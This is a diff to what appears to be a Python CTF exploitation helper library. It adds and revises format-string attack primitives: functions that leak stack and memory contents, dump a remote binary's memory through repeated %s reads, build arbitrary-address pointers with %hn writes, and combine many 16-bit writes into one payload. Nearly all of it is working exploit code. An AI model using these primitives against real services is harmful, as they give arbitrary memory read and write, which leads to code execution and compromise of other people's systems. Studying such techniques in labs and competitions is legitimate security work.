@@ -221,26 +221,91 @@ def fuzz(after=None, until=None, n=50, infinite=True, dollar=True):
         sl(b"%p."*n + f"{until}".encode())
         return ru(b"." + f"{until}".encode()).split(b".")
 
+def fuzz_at(where, n=50):
+    for i in range(0, n):
+        data = uu64(read(where + i*8))
+        if len(data) <= 8:
+            data = hex(u64(data.ljust(8, b"\x00")))
+        offset = (where + i*8 - where)
+        print(f"Index {i} / Offset {offset:#x}: {where + i*8:#x} -> {data}")        
+
+# Dump binary
+def dump_memory(start_addr, size, offset=43, output="dump.bin"):
+    dump_file = Path(output)
+    state_file = Path(f"{output}.addr")
+    end_addr = start_addr + size
+
+    # Resume from the saved address when available
+    if state_file.exists():
+        addr = int(state_file.read_text().strip(), 0)
+        log.info(f"Resuming from {addr:#x}")
+    else:
+        addr = start_addr
+        dump_file.write_bytes(b"")
+
+    def save_state():
+        state_file.write_text(hex(addr))
+        log.success(f"Saved {dump_file.stat().st_size} bytes")
+        log.info(f"Resume address: {addr:#x}")
+
+    try:
+        with dump_file.open("ab") as f:
+            while addr < end_addr:
+                # Skip addresses containing a newline byte
+                if b"\x0a" in p64(addr):
+                    f.write(b"\x00")
+                    addr += 1
+                    state_file.write_text(hex(addr))
+                    continue
+
+                log.info(f"Dumping {addr:#x}")
+
+                set(addr)
+                sla(b"> ", f"%{offset}$sEND".encode())
+
+                chunk = ru(b"END", drop=True)
+                recovered = chunk + b"\x00"
+
+                f.write(recovered)
+                f.flush()
+
+                addr += len(recovered)
+                state_file.write_text(hex(addr))
+
+    except KeyboardInterrupt:
+        log.warning("Dump interrupted by user")
+
+    except EOFError:
+        log.warning("Connection closed")
+
+    finally:
+        save_state()
+
+    return dump_file.read_bytes()
+
+
 def write(where, what, offset=12):
     for i in range(len(what)):
         writes = {where + i:what[i]}
         input = fmtstr_payload(offset, writes, write_size='byte')
         sl(input)
 
-def set(where, stack2=30, offset=11, target=45, until="=="):
-    # 11 -> 45
-    # 30 -> 47
+def set(where, stack2=13, offset=10, target=40, until="==", slot_delta=0):
+    # 10 -> 40, 13 -> 43 (Victim at)
     n = max(1, (where.bit_length() + 15) // 16)
     sl(f"{until}%{stack2}$p{until}")
     ru(until)
     second_stack = int(ru(until), 16)
     for i in range(n):  # write 0..(n-1) halfwords
-        off  = (second_stack + 2*i) & 0xffff
+        off  = (second_stack + slot_delta + 2*i) & 0xffff
         part = (where >> (16*i)) & 0xffff
+        # 10
         sl(f"%{off}c%{offset}$hn{until}")
         ru(until)
+        # 40 
         sl(f"%{part}c%{target}$hn{until}")
         ru(until)
+
 
 def read(where, until="==", target=47):
     set(where)
@@ -265,6 +330,33 @@ def write8byte(where, what, byte8=False):
         part = (what >> (16*i)) & 0xffff
         write2byte(where + 2*i, part)
         sleep(0.1)
+
+def writeonce(where, payload, prefix=b"END;#", base_arg=43):
+    # 10 -> 40, 13 -> 43 (Victim at)
+    writes = []
+    for i in range(0, len(payload), 8):
+        qword = u64(payload[i:i + 8].ljust(8, b"\x00"))
+        target = where + i
+        for j in range(4):
+            writes.append((target + 2*j, (qword >> (16*j)) & 0xffff))
+
+    for idx, (addr, val) in enumerate(writes):
+        set(addr, slot_delta=idx * 8)
+
+    final = prefix
+    printed = len(final)
+
+    for idx, (addr, val) in enumerate(writes):
+        arg = base_arg + idx
+        pad = (val - printed) & 0xffff
+        if pad:
+            final += f"%{pad}c".encode()
+            printed = (printed + pad) & 0xffff
+            final += f"%{arg}$hn".encode()
+
+    sl(final)
+    return final
+
 
 # Exit
 rol = lambda val, r_bits, max_bits: \
